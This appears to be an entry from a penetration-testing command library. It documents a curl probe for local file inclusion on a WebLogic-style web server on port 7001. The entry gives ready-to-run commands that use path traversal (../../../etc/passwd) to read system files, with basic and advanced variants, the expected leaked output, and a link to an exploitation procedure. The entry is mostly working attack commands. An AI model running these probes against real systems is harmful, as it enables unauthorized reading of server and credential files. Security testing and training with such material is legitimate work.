---
id: cmd-curl-lfi-probe
data: 'curl "http://target:7001/vulnerable?file=../../../etc/passwd" --verbose'
tags:
  - lfi
  - probe
  - web
type: command
output: HTTP response containing file contents if vulnerable
executor: bash
platforms:
  - Linux
  - Windows
  - macOS
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:26:21.611Z'
verified: false
validated: true
submitted: true
---
# curl-lfi-probe

## Command

```bash
curl "http://target:7001/vulnerable?file=../../../etc/passwd" --verbose
```

## Description

This command probes for LFI vulnerabilities by sending an HTTP GET request with path traversal to include a system file like /etc/passwd. Use it to test unauthenticated endpoints in web applications like Oracle WebLogic.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| URL | Target endpoint with payload (e.g., ?file=../../../etc/passwd) | Yes |
| --verbose | Enable detailed output including headers | No |

## Examples

### Basic Usage

```bash
curl "http://target:7001/test.jsp?include=../../../etc/passwd" -v
```

### Advanced Usage

```bash
curl -H "User-Agent: Mozilla/5.0" "http://target:7001/vulnerable?file=../../../etc/passwd" -v -s
```

## Expected Output

If vulnerable, the response body will contain lines from /etc/passwd (e.g., root:x:0:0:root:/root:/bin/bash). Otherwise, 404 or empty/error response.

## Related

- [[Related Procedure|procedures/Exploit-LFI-in-Oracle-WebLogic-Server]]
